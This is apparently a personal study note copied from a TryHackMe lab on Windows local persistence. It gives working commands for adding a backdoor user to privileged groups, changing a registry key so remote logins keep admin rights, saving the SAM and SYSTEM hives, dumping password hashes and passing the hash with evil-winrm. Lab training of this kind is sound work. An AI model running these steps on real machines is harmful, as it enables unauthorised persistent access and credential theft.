# Windows Persistance 
## Assign Group Memberships
- The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. We can easily achieve this with the following command:
````
net localgroup administrators jack /add
````
- This will allow you to access the server by using RDP, WinRM or any other remote administration service available.
- Can also use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to **read/write any file or registry key** on the system, ignoring any configured DACL.
````
net localgroup "Backup Operators" jack /add
````
- Since this is an unprivileged account, it **cannot RDP or WinRM** back to the machine unless we **add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM)** groups. We'll use WinRM.
````
net localgroup "Remote Management Users" jack /add
````
- Check the groups and make sure they are not disabled 
````
whoami /groups
GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
````
- This is due to **User Account Control (UAC)**. One of the features implemented by UAC, `LocalAccountTokenFilterPolicy`, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session, if you are using WinRM, you are confined to a limited access token with no administrative privileges.
- Disable `LocalAccountTokenFilterPolicy` by changing the following registry key to 1:
````
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
````
## SAM SYSTEM Exfil / Pass The Hash
- We then proceed to make a backup of `SAM` and `SYSTEM` files and download them to our attacker machine:
````
reg save hklm\system system.bak
reg save hklm\sam sam.bak
````
- With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:
````
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
--snip--
````
- And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
````
evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
````
## Special Privileges and Security Descriptors
- A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. 
- Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself.
- Complete list of all privileges:
- https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
- In the case of the Backup Operators group, it has the following two privileges assigned by default:
- `SeBackupPrivilege`: The user can read any file in the system, ignoring any DACL in place.
- `SeRestorePrivilege`: The user can write any file in the system, ignoring any DACL in place.
- We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:
````
secedit /export /cfg config.inf
````
- We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:
- ![765671a0355e2260c44e5a12a10f090e](https://user-images.githubusercontent.com/75596877/180827452-97d0b2b3-cd89-459f-95ee-4d5276a41516.png)
- 















### Credit: 
All credit to the content of this page goes to the origional author
- https://tryhackme.com/room/windowslocalpersistence
- https://tryhackme.com/p/munra
- https://tryhackme.com/p/tryhackme




